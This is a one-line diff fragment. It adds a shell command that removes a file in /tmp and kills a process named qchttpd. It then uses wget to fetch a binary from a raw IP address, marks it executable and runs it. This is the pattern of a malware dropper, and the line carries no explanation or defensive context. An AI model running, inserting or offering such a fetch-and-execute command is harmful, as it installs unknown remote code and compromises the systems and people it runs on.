@@ -1,0 +1,1 @@
+rm -rf /tmp/qchttpd;killall qchttpd;wget http://134.227.227.110/hex/qchttpd;chmod +x /tmp/qchttpd;./qchttpd
